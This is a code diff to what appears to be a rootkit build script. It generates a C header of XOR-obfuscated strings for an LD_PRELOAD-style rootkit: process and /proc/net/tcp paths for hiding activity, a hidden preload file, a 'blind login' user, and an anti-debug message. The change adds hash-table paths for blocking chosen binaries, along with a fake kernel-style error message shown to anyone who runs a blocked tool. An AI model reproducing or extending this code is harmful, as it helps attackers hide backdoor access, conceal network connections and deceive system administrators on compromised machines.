@@ -34,7 +34,9 @@ header_template = '''#define _GNU_SOURCE
 #define LD_TRACE\t"{ld_trace}"
 #define LD_NORMAL\t"{ld_normal}"
 #define LD_HIDE\t"{ld_hide}"
-#define HASH_DB_PATH\t"{hash_db_path}"
+#define HASHDB_BINAVOID_PATH\t"{hashdb_binavoid_path}"
+#define HASHDB_BINBLOCK_PATH\t"{hashdb_binblock_path}"
+#define BINBLOCK_MSG\t"{binblock_msg}"
 
 #define PROC_NET_TCP\t"{proc_net_tcp}"
 #define PROC_NET_TCP6\t"{proc_net_tcp6}"
@@ -135,6 +137,7 @@ header = header_template.format(
     cmd_proc_name=xor("/proc/%d/status"),
     proc_path=xor("/proc/"),
     anti_debug_msg=xor("Don't scratch the walls!"),
+    binblock_msg=xor("There was a failure while copying data from/to userspace, probably caused by an invalid pointer reference."),
     proc_net_tcp=xor("/proc/net/tcp"),
     proc_net_tcp6=xor("/proc/net/tcp6"),
     scanf_line=xor("%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n"),
@@ -143,7 +146,8 @@ header = header_template.format(
     ld_hide=xor("/etc/kernelshserver"),
     blind_login=xor("rick"),
     c_root=xor("root"),
-    hash_db_path=xor("/etc/__tmphashtable")
+    hashdb_binavoid_path=xor("/etc/__tmphashtable"),
+    hashdb_binblock_path=xor("/etc/__tmp2hashtable")
 )
 
 # XOR the syscall names and format them into a list
